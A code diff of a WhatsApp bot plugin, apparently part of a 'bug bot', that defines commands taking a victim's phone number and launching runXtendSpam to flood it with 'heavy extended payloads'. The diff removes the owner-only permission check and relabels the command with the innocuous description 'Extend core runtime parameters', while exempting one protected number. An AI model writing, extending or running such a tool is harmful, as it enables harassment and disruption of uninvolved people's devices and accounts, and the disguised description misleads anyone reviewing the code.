@@ -1,37 +1,31 @@
-let { runXtendSpam } = require('../lib/rizouxtend');
+const { runXtendSpam } = require('../lib/rizouxtend');
 
-let handler = async (m, { conn, args, command, isCreator }) => {
-    if (!isCreator) return m.reply('🔒 *Owner Only - Xtend Command!*');
-
+module.exports = {
+  name: "rizouxtend",
+  commands: ['xtend', 'rizouxtend', 'inrespext'],
+  category: "owner",
+  description: "Extend core runtime parameters",
+  async execute(sock, m, args) {
     if (!args[0]) {
-        return m.reply(`📌 *Usage:* .${command} 923xx`);
+      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .xtend 923xx` }, { quoted: m });
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-
-    if (!pepec) {
-        return m.reply('❌ *Invalid number format!*');
-    }
+    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-        return m.reply('🔒 *This number is protected!*');
+      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
     }
 
     let target = pepec + '@s.whatsapp.net';
-
-    await m.reply(`🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads (666 loops)...*`);
+    await sock.sendMessage(m.chat, { text: `🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads...*` }, { quoted: m });
 
     try {
-        runXtendSpam(conn, target);
-        await conn.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
+      runXtendSpam(sock, target);
+      await sock.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
     } catch (error) {
-        console.error("Xtend Plugin Error:", error);
-        m.reply("⚠️ Error: inRespXtend execute karte waqt masla aaya hai.");
+      await sock.sendMessage(m.chat, { text: "⚠️ Error: inRespXtend execute karte waqt masla aaya hai." }, { quoted: m });
     }
-}
-
-handler.command = ['xtend', 'rizouxtend', 'inrespext'];
-handler.tags = ['owner', 'rizo'];
-handler.help = ['xtend 923xx'];
-module.exports = handler;
+  }
+};
